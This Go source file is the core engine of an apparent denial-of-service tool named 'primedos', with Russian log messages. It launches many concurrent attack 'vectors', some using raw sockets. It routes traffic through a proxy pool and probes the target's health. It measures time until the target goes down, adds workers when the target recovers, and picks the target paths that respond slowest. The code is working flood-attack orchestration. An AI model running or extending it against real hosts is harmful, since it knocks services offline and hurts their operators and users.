package engine

import (
	"context"
	"fmt"
	"math"
	"math/rand"
	"net"
	"net/http"
	"os"
	"sort"
	"sync"
	"time"

	"golang.org/x/sys/unix"

	"primedos/internal/config"
	"primedos/internal/core"
	"primedos/internal/health"
	"primedos/internal/metrics"
	"primedos/internal/proxies"
	"primedos/internal/target"
	"primedos/internal/vectors"
)

type Engine struct {
	cfg     *config.Config
	tgt     *target.Target
	pool    *proxies.Pool
	sess    *core.Session
	c       *core.Counters
	prober  *health.Prober
	sampler *metrics.Sampler
	logs    *core.LogBuffer

	ctx    context.Context
	cancel context.CancelFunc
	wg     sync.WaitGroup

	mu         sync.Mutex
	start      time.Time
	done       bool
	timeToDown time.Duration
	workers    int
	active     []vectors.Def
	skipped    []string
	stopped    bool
}

func New(cfg *config.Config, tgt *target.Target) (*Engine, error) {
	pool, err := proxies.Load(cfg.ProxiesFile)
	if err != nil {
		return nil, err
	}
	c := core.NewCounters()
	sess := &core.Session{
		Cfg:  cfg,
		Tgt:  tgt,
		C:    c,
		Pool: pool,
		Dry:  cfg.DryRun,
	}
	sess.Lim = core.NewLimiter(cfg.RateLimitMbps * 1000 * 1000 / 8)

	e := &Engine{
		cfg:     cfg,
		tgt:     tgt,
		pool:    pool,
		sess:    sess,
		c:       c,
		prober:  health.New(tgt, cfg.Timeout(), cfg.HealthInterval()),
		sampler: metrics.New(),
		logs:    core.NewLogBuffer(64),
	}
	sess.Logf = func(f string, a ...any) { e.logs.Add(f, a...) }
	return e, nil
}

func (e *Engine) Logs() *core.LogBuffer { return e.logs }

func (e *Engine) Start() error {
	e.ctx, e.cancel = context.WithCancel(context.Background())
	e.start = time.Now()

	if iface := metrics.DefaultIface(); iface != "" {
		if warn := metrics.OffloadWarning(iface); warn != "" {
			e.logs.Add("%s", warn)
		}
		if e.cfg.HWTimestamps {
			ok, _ := metrics.ProbeHWTimestamps(iface)
			if ok {
				e.logs.Add("метки времени: hardware")
			} else {
				e.logs.Add("метки времени: software")
			}
		}
	}

	if e.pool.Enabled() {
		go func() {
			e.pool.Check(e.ctx, e.cfg.Timeout())
			e.logs.Add("прокси: живых %d из %d", e.pool.Alive(), e.pool.Len())
		}()
	} else {
		e.logs.Add("proxies: off")
	}

	e.active = vectors.Select(e.cfg.Level)
	if e.cfg.Level >= 3 {
		go e.adaptPaths()
	}

	if e.cfg.DryRun {
		e.workers = e.cfg.Concurrency
		e.logs.Add("режим dry-run: трафик не генерируется")
		e.simulate()
	} else {
		e.startProber()
		e.startVectors()
		e.startTCPInfo()
		e.startReconcile()
	}

	e.control()
	return nil
}

func (e *Engine) startProber() {
	e.wg.Add(1)
	go func() {
		defer e.wg.Done()
		e.prober.Run(e.ctx)
	}()
}

func (e *Engine) startVectors() {
	root := os.Geteuid() == 0
	var usable []vectors.Def
	for _, d := range e.active {
		if d.NeedsRaw && !root {
			e.mu.Lock()
			e.skipped = append(e.skipped, d.Name)
			e.mu.Unlock()
			e.logs.Add("%s: пропущен, требуется CAP_NET_RAW", d.Name)
			continue
		}
		usable = append(usable, d)
	}
	if len(usable) == 0 {
		e.logs.Add("нет доступных векторов")
		return
	}
	per := e.cfg.Concurrency / len(usable)
	if per < 1 {
		per = 1
	}
	for i, d := range usable {
		n := per
		if i == 0 {
			n += e.cfg.Concurrency - per*len(usable)
		}
		e.startWorkers(d, n)
		e.mu.Lock()
		e.workers += n
		e.mu.Unlock()
	}
	e.mu.Lock()
	e.active = usable
	e.mu.Unlock()
	e.logs.Add("запущено векторов: %d, воркеров: %d", len(usable), e.workers)
}

func (e *Engine) startWorkers(def vectors.Def, n int) {
	for i := 0; i < n; i++ {
		w := &core.Worker{
			S:   e.sess,
			L:   e.c.NewLocal(),
			R:   rand.New(rand.NewSource(time.Now().UnixNano() + int64(i*7919))),
			ID:  i,
			Ctx: e.ctx,
		}
		e.wg.Add(1)
		go func(d vectors.Def, wk *core.Worker) {
			defer e.wg.Done()
			defer func() {
				if r := recover(); r != nil {
					e.c.Errors.Add(1)
					e.logs.Add("%s: паника воркера: %v", d.Name, r)
				}
			}()
			if err := d.Run(e.ctx, wk); err != nil && e.ctx.Err() == nil {
				e.c.Errors.Add(1)
				e.logs.Add("%s: остановлен: %v", d.Name, err)
			}
		}(def, w)
	}
}

func (e *Engine) escalate() {
	e.mu.Lock()
	active := append([]vectors.Def(nil), e.active...)
	n := e.workers / 4
	e.mu.Unlock()
	if len(active) == 0 {
		return
	}
	if n < len(active) {
		n = len(active)
	}
	per := n / len(active)
	if per < 1 {
		per = 1
	}
	for _, d := range active {
		e.startWorkers(d, per)
	}
	e.mu.Lock()
	e.workers += per * len(active)
	e.mu.Unlock()
	e.logs.Add("эскалация: +%d воркеров, всего %d", per*len(active), e.workers)
}

func (e *Engine) control() {
	e.wg.Add(1)
	go func() {
		defer e.wg.Done()
		tick := time.NewTicker(200 * time.Millisecond)
		defer tick.Stop()

		var durC <-chan time.Time
		if e.cfg.Mode == 3 {
			tm := time.NewTimer(e.cfg.DurationValue())
			defer tm.Stop()
			durC = tm.C
		}
		wasDown := false
		for {
			select {
			case <-e.ctx.Done():
				return
			case <-durC:
				e.logs.Add("фиксированное время истекло")
				e.finish(0)
				return
			case <-tick.C:
				st := e.prober.Snapshot()
				switch e.cfg.Mode {
				case 1:
					if st.State == core.HealthOffline {
						e.logs.Add("цель недоступна (%d), останов", st.Code)
						e.finish(time.Since(e.start))
						return
					}
				case 2:
					if st.State == core.HealthOffline {
						wasDown = true
					}
					if wasDown && st.State != core.HealthOffline {
						wasDown = false
						e.logs.Add("цель восстановилась, эскалация")
						e.escalate()
					}
				}
			}
		}
	}()
}

func (e *Engine) finish(ttd time.Duration) {
	e.mu.Lock()
	if e.done {
		e.mu.Unlock()
		return
	}
	e.done = true
	if ttd > 0 {
		e.timeToDown = ttd
	}
	e.mu.Unlock()
	e.cancel()
}

func (e *Engine) Stop() {
	e.mu.Lock()
	if !e.done {
		e.done = true
	}
	stopped := e.stopped
	e.stopped = true
	e.mu.Unlock()
	if !stopped && e.cancel != nil {
		e.cancel()
	}
	e.wg.Wait()
}

func (e *Engine) simulate() {
	e.wg.Add(1)
	go func() {
		defer e.wg.Done()
		t := time.NewTicker(100 * time.Millisecond)
		defer t.Stop()
		for {
			select {
			case <-e.ctx.Done():
				return
			case <-t.C:
				el := time.Since(e.start).Seconds()
				rate := 4.2e9 + 0.6e9*math.Sin(el/3) + 0.25e9*rand.Float64()
				bytes := rate / 8 * 0.1
				e.c.Add(nil, uint64(bytes), uint64(bytes*0.82), uint64(bytes/1100), uint64(bytes/3400))
			}
		}
	}()
	e.wg.Add(1)
	go func() {
		defer e.wg.Done()
		select {
		case <-e.ctx.Done():
			return
		case <-time.After(12 * time.Second):
		}
		e.prober.SetSimulated(core.HealthOffline, 503)
		e.logs.Add("dry-run: цель помечена OFFLINE (503)")
	}()
}

func (e *Engine) startTCPInfo() {
	e.wg.Add(1)
	go func() {
		defer e.wg.Done()
		t := time.NewTicker(2 * time.Second)
		defer t.Stop()
		for {
			select {
			case <-e.ctx.Done():
				return
			case <-t.C:
				c, err := net.DialTimeout("tcp", e.tgt.Addr(), 2*time.Second)
				if err != nil {
					continue
				}
				if tc, ok := c.(*net.TCPConn); ok {
					if raw, err := tc.SyscallConn(); err == nil {
						raw.Control(func(fd uintptr) {
							if info, err := unix.GetsockoptTCPInfo(int(fd), unix.IPPROTO_TCP, unix.TCP_INFO); err == nil {
								e.c.Retrans.Store(uint64(info.Total_retrans))
								e.c.Segments.Store(uint64(info.Segs_out))
							}
						})
					}
				}
				c.Close()
			}
		}
	}()
}

func (e *Engine) startReconcile() {
	e.wg.Add(1)
	go func() {
		defer e.wg.Done()
		t := time.NewTicker(60 * time.Second)
		defer t.Stop()
		for {
			select {
			case <-e.ctx.Done():
				return
			case <-t.C:
				wire, payload, packets, requests := e.c.SumLocal()
				gw := e.c.BytesWire.Load()
				gp := e.c.BytesPayload.Load()
				gpk := e.c.Packets.Load()
				grq := e.c.Requests.Load()
				if wire != gw || payload != gp || packets != gpk || requests != grq {
					var div float64
					if gw > 0 {
						div = absDiff(wire, gw) / float64(gw) * 100
					}
					e.logs.Add("пересчёт: локальные %d/%d, глобальные %d/%d, расхождение %.2f%%",
						wire, packets, gw, gpk, div)
				}
			}
		}
	}()
}

func absDiff(a, b uint64) float64 {
	if a > b {
		return float64(a - b)
	}
	return float64(b - a)
}

func (e *Engine) adaptPaths() {
	cands := []string{"/", "/index.html", "/api", "/api/v1", "/search?q=a", "/login", "/cart", "/product/1", "/about", "/robots.txt"}
	cl := &http.Client{Timeout: 3 * time.Second, CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}
	type res struct {
		path string
		lat  time.Duration
	}
	var out []res
	for _, p := range cands {
		if e.ctx.Err() != nil {
			return
		}
		t0 := time.Now()
		req, err := http.NewRequestWithContext(e.ctx, http.MethodHead, e.tgt.BaseURL()+p, nil)
		if err != nil {
			continue
		}
		resp, err := cl.Do(req)
		if err == nil {
			resp.Body.Close()
			out = append(out, res{p, time.Since(t0)})
		}
	}
	if len(out) < 3 {
		return
	}
	sort.Slice(out, func(i, j int) bool { return out[i].lat < out[j].lat })
	paths := []string{out[0].path, out[1].path, out[2].path}
	e.mu.Lock()
	e.cfg.Paths = paths
	e.mu.Unlock()
	e.logs.Add("adaptive: выбраны пути %v", paths)
}

func (e *Engine) Snapshot() core.Stats {
	e.mu.Lock()
	start := e.start
	done := e.done
	ttd := e.timeToDown
	workers := e.workers
	active := vectors.Names(e.active)
	e.mu.Unlock()

	if start.IsZero() {
		start = time.Now()
	}
	s := e.sampler.Observe(e.c)
	p50, p95, p99 := e.c.RTTPercentiles()
	segs := e.c.Segments.Load()
	retr := e.c.Retrans.Load()
	loss := 0.0
	if segs > 0 {
		loss = float64(retr) / float64(segs) * 100
	}

	proxiesAlive := 0
	if e.pool != nil {
		proxiesAlive = e.pool.Alive()
	}

	return core.Stats{
		Target:       e.tgt.Host,
		CDN:          e.tgt.CDN,
		IP:           e.tgt.IP(),
		Level:        e.cfg.Level,
		Mode:         e.cfg.Mode,
		Workers:      workers,
		Vectors:      active,
		Running:      e.ctx != nil && e.ctx.Err() == nil,
		Done:         done,
		Elapsed:      time.Since(start),
		Bps:          s.Bps,
		Pps:          s.Pps,
		Rps:          s.Rps,
		TotalWire:    e.c.BytesWire.Load(),
		TotalPayload: e.c.BytesPayload.Load(),
		TotalReq:     e.c.Requests.Load(),
		Errors:       e.c.Errors.Load(),
		P50:          p50,
		P95:          p95,
		P99:          p99,
		Loss:         loss,
		Health:       e.prober.Snapshot(),
		TimeToDown:   ttd,
		Logs:         e.logs.Tail(4),
		Proxies:      proxiesAlive,
		RateMbps:     e.cfg.RateLimitMbps,
	}
}

func (e *Engine) Peak() float64 { return e.sampler.Peak() }

func (e *Engine) Average() float64 { return e.sampler.Average() }

func (e *Engine) Describe() string {
	return fmt.Sprintf("%s → %s (%s), уровень %d", e.tgt.Host, e.tgt.IP(), e.tgt.CDN, e.cfg.Level)
}
